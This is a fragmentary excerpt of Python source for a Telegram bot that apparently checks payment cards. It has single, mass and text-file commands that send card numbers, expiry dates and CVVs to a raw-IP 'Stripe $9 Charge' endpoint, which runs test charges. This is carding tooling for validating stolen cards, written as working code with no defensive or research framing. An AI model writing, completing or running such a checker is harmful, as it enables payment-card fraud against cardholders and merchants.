...
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Stripe $9 Charge"
API_BASE = "http://199.244.48.163:8042/stripe_charge9"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100
...
async def call_stripe9_api(fullcc):
    ...
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                resp = await session.get(endpoint_url)
                data = resp.json()
...
# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/st9)
# -------------------------------------------------------------
@Client.on_message(filters.command("st9", [".", "/"]))
async def stripe9_cmd(Client, message):
    try:
...
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        ...
        status, response, gateway = await call_stripe9_api(fullcc)
...
# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mst9)
# -------------------------------------------------------------
@Client.on_message(filters.command("mst9", [".", "/"]))
async def stripe9_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
...
↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mst9 cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return
...
# -------------------------------------------------------------
# TXT FILE COMMAND (/tst9)
# -------------------------------------------------------------
@Client.on_message(filters.command("tst9", [".", "/"]))
async def stripe9_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
...
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    ...
    progress_text = f"""Stripe $9 Charge
Admin
